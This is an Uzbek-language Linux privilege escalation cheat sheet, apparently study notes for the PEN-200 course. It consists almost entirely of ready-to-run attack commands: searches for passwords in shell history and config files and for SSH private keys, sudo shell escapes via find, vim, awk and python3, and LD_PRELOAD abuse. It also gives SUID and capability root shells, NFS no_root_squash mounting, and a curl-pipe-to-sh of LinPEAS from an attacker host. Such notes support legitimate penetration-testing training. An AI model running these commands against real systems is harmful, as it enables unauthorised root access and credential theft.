Linux Privilege Escalation (PEN-200: 18-modul)
===========================================================

Tizim va Yadro Ma'lumotlarini Yig'ish (System Enumeration)
-----------------------------------------------------------
1. OS va Yadro (Kernel) versiyasini aniqlash
> uname -a

2. Linux distributivi va versiyasini ko'rish
> cat /etc/os-release
> hostnamectl

3. Server nomini (hostname) ko'rish
> hostname
-----------------------------------------------------------

Foydalanuvchilar va Guruhlar Huquqlarini Aniqlash
-----------------------------------------------------------
1. Joriy foydalanuvchi, UID/GID va a'zo bo'lgan guruhlarini tekshirish
> id
> whoami

2. Tizimdagi barcha interaktiv foydalanuvchilarni ko'rish
> cat /etc/passwd | grep -E "(/bin/bash|/bin/sh)"

3. Muhit o'zgaruvchilarini (PATH, API kalitlar, maxfiy o'zgaruvchilar) tekshirish
> env
> echo $PATH
-----------------------------------------------------------

Faol Jarayonlar va Yashirin Xizmatlar (Processes)
-----------------------------------------------------------
1. Tizimda ishlayotgan barcha jarayonlarni ko'rish
> ps aux
> ps -ef --forest

2. Faqat root nomidan ishlayotgan jarayonlarni ajratib ko'rish
> ps -ef | grep "^root" | grep -v "\[.*\]"

3. Root huquqisiz fonda chaqirilayotgan tezkor jarayonlarni real vaqtda kuzatish (pspy)
> ./pspy64 -pf -i 1000
-----------------------------------------------------------

Tarmoq va Ichki Portlar (Network & Open Ports)
-----------------------------------------------------------
1. Tarmoq interfeyslari va IP manzillarni aniqlash
> ip a

2. Faqat lokal xostda (127.0.0.1 / localhost) tinglanayotgan ichki portlarni ko'rish
> ss -tulnp | grep "127.0.0.1"
> netstat -tulnp
-----------------------------------------------------------

Tizimdagi Izlar va Saqlangan Parollarni Qidirish (Inspecting Trails)
-----------------------------------------------------------
1. Terminal buyruqlar tarixini tekshirish
> cat ~/.bash_history
> cat ~/.nano_history

2. Konfiguratsiya fayllaridan parollarni qidirish
> grep -rnwi "password" /var/www/ 2>/dev/null
> grep -rnwi "DB_PASSWORD" /etc/ 2>/dev/null

3. Ochiq qolgan shaxsiy SSH kalitlarni (id_rsa) qidirish
> find / -name "id_rsa*" 2>/dev/null

4. Tizim pochtasini o'qish (cron xatoliklari va hisobotlar)
> cat /var/mail/$USER
-----------------------------------------------------------

Rejalashtirilgan Vazifalar (Cron Jobs & Systemd Timers)
-----------------------------------------------------------
1. Joriy foydalanuvchi cron vazifalarini ko'rish
> crontab -l

2. Tizim miqyosidagi barcha cron fayllarini tekshirish
> cat /etc/crontab
> ls -la /etc/cron.*

3. Cron skriptlarining ruxsatini (yozish huquqi bor-yo'qligini) tekshirish
> ls -la /path/to/cron/script.sh

4. Rejalashtirilgan systemd taymerlarini ko'rish
> systemctl list-timers --all
-----------------------------------------------------------

Fayl Ruxsatlari Zaifliklari (Insecure File Permissions)
-----------------------------------------------------------
1. /etc/passwd va /etc/shadow fayllarining ruxsatlarini tekshirish
> ls -la /etc/passwd /etc/shadow

2. Tizimda oddiy foydalanuvchi yoza oladigan barcha fayllarni topish
> find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

3. Barcha uchun yozish ochiq bo'lgan kataloglarni (World-writable) topish
> find / -type d -perm -0002 2>/dev/null
-----------------------------------------------------------

Sudo Huquqlari va Misconfigurations (Sudo Privileges)
-----------------------------------------------------------
1. Foydalanuvchiga berilgan barcha sudo huquqlarini tekshirish
> sudo -l

2. Agar sudo ro'yxatida NOPASSWD bilan dasturlar (GTFOBins) bo'lsa, qobiq chaqirish
> sudo find . -exec /bin/sh \; -quit
> sudo vim -c ':!/bin/sh'
> sudo awk 'BEGIN {system("/bin/sh")}'
> sudo python3 -c 'import os; os.system("/bin/sh")'

3. Sudo parametrlarida env_keep+=LD_PRELOAD ruxsati bo'lsa
> sudo LD_PRELOAD=/tmp/pe.so <ruxsat_berilgan_buyruq>
-----------------------------------------------------------

SUID va SGID Binar Fayllari (SUID/SGID Binaries)
-----------------------------------------------------------
1. Tizimdagi barcha SUID fayllarni qidirish
> find / -perm -u=s -type f 2>/dev/null
> find / -perm -4000 -type f 2>/dev/null

2. Standart bo'lmagan SUID binar (masalan bash) mavjud bo'lsa
> /usr/bin/bash -p

3. Maxsus SUID binar ichidagi chaqirilayotgan matnlarni tekshirish (PATH hijacking uchun)
> strings /usr/local/bin/custom_binary
-----------------------------------------------------------

Linux Imtiyozlari (Linux Capabilities)
-----------------------------------------------------------
1. Tizim bo'ylab fayllarga biriktirilgan barcha capabilities-larni topish
> getcap -r / 2>/dev/null

2. Agar cap_setuid+ep imtiyozi berilgan binar topilsa (masalan python3)
> /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
-----------------------------------------------------------

Tarmoq Fayl Tizimi (NFS Misconfiguration)
-----------------------------------------------------------
1. NFS orqali ulashilgan papkalar va ularning sozlamalarini ko'rish
> cat /etc/exports

2. 'no_root_squash' opsiyasi mavjud bo'lsa, masofaviy NFS papkani mount qilish
> showmount -e <TARGET_IP>
> mount -o rw <TARGET_IP>:/shared /mnt/nfs
-----------------------------------------------------------

Avtomatlashtirilgan Skanerlash (Automated Enumeration Tools)
-----------------------------------------------------------
1. LinPEAS skriptini xotiradan to'g'ridan-to'g'ri ishga tushirish
> curl -L http://<KALI_IP>/linpeas.sh | sh

2. LinPEAS faylini diskka yuklab olib ishga tushirish
> wget http://<KALI_IP>/linpeas.sh -O /dev/shm/linpeas.sh
> chmod +x /dev/shm/linpeas.sh
> /dev/shm/linpeas.sh -a > /dev/shm/linpeas.txt

3. LinEnum skriptini ishga tushirish
> ./LinEnum.sh -k password -r linenum_output.txt
-----------------------------------------------------------
